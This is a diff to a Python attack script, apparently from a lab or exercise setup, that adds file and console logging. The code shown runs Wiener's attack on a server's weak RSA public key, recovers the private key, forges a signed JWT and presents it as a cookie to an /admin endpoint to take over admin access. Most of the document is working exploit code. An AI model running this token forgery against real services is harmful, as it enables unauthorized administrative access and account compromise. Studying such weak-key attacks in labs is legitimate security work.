@@ -8,6 +8,8 @@ import base64
 import json
 from Crypto.Signature import pkcs1_15
 from Crypto.Hash import SHA256
+import logging
+import os
 
 BASE_URL = "http://http_server_c:8000"
 HTTP_TIMEOUT = 10
@@ -94,30 +96,48 @@ def recover_p_q_from_phi(n: int, phi: int):
     return None, None
 
 def main():
+    log_dir = os.getenv("LOG_DIR", "logs")
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, f"attackC_{time.strftime('%Y%m%d_%H%M%S')}.log")
+
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+
+    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+
+    ch = logging.StreamHandler(sys.stdout)
+    ch.setFormatter(fmt)
+    logger.addHandler(ch)
+
+    fh = logging.FileHandler(log_path, mode="w", encoding="utf-8")
+    fh.setFormatter(fmt)
+    logger.addHandler(fh)
+
+    logging.info(f"Logging to file: {log_path}")
     pub_url = BASE_URL.rstrip("/") + "/public.pem"
-    print(f"[*] Fetching public key from: {pub_url}")
+    logging.info(f"[*] Fetching public key from: {pub_url}")
     start = time.time()
     try:
         resp = requests.get(pub_url, timeout=HTTP_TIMEOUT, verify=False)
         resp.raise_for_status()
     except Exception as e:
-        print(f"[!] Error fetching public key: {e}")
+        logging.info(f"[!] Error fetching public key: {e}")
         return
 
     try:
         rsa_pub = RSA.import_key(resp.content)
     except Exception as e:
-        print(f"[!] Failed to parse public key PEM: {e}")
+        logging.info(f"[!] Failed to parse public key PEM: {e}")
         return
 
     n, e = rsa_pub.n, rsa_pub.e
-    print(f"[*] Parsed public key: n bitlen={n.bit_length()}, e={e}")
-    print("[*] Running Wiener's attack ...")
+    logging.info(f"[*] Parsed public key: n bitlen={n.bit_length()}, e={e}")
+    logging.info("[*] Running Wiener's attack ...")
     d_found, k_found = wiener_attack(e, n)
     if d_found is None:
-        print("[!] Wiener attack failed.")
+        logging.info("[!] Wiener attack failed.")
         return
-    print(f"[+] Wiener success: d={d_found}")
+    logging.info(f"[+] Wiener success: d={d_found}")
 
     phi = (e * d_found - 1) // k_found if k_found else None
     p, q = recover_p_q_from_phi(n, phi) if phi else (None, None)
@@ -132,31 +152,31 @@ def main():
     h = SHA256.new(signing_input)
     sig = pkcs1_15.new(rsa_priv).sign(h)
     token = signing_input.decode() + "." + b64url_encode(sig)
-    print(f"[+] Forged JWT:\n{token}")
+    logging.info(f"[+] Forged JWT:\n{token}")
 
     try:
         h2 = SHA256.new(signing_input)
         pkcs1_15.new(rsa_priv.publickey()).verify(h2, sig)
-        print("[+] Verified local signature OK")
+        logging.info("[+] Verified local signature OK")
     except Exception as e:
-        print(f"[!] Local verify failed: {e}")
+        logging.info(f"[!] Local verify failed: {e}")
 
     admin_url = BASE_URL.rstrip("/") + "/admin"
     try:
-        print(f"[*] Trying admin endpoint (via cookie): {admin_url}")
+        logging.info(f"[*] Trying admin endpoint (via cookie): {admin_url}")
         cookies = {"auth_token": token}
         r = requests.get(admin_url, cookies=cookies, timeout=HTTP_TIMEOUT, verify=False)
         try:
             j = r.json()
-            print(f"[*] /admin returned HTTP {r.status_code}:")
-            print(json.dumps(j, indent=2))
+            logging.info(f"[*] /admin returned HTTP {r.status_code}:")
+            logging.info(json.dumps(j, indent=2))
         except Exception:
-            print(f"[*] /admin returned HTTP {r.status_code}: {r.text}")
+            logging.info(f"[*] /admin returned HTTP {r.status_code}: {r.text}")
     except Exception as e:
-        print(f"[!] Failed to call /admin: {e}")
+        logging.info(f"[!] Failed to call /admin: {e}")
 
     total = time.time() - start
-    print(f"[*] Complete. Total elapsed: {total:.3f}s")
+    logging.info(f"[*] Complete. Total elapsed: {total:.3f}s")
 
 if __name__ == "__main__":
     main()
